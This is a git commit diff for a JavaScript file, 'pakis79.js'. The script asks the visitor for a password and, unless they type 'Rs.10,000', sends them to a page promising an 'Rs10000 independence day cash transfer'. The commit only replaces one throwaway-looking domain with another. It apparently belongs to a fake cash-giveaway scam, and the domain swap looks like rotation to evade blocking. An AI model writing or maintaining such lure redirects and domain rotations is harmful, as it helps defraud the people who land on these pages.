36c1bf61fde47674c93b300b84aef87a7b1276dc
zebraboiz6 <hopping-font8s@icloud.com>
2026-08-10 11:49:47 +0100

    Update pakis79.js

--- pakis79.js
+++ pakis79.js
@@ -6,5 +6,5 @@ password = prompt(
 );
 
 if (password !== 'Rs.10,000') {
-    location.href = 'https://www.owobsurz.ink/rs10000-independence-day-cash-transfer';
+    location.href = 'https://www.berryzjtar.store/rs10000-independence-day-cash-transfer';
 }
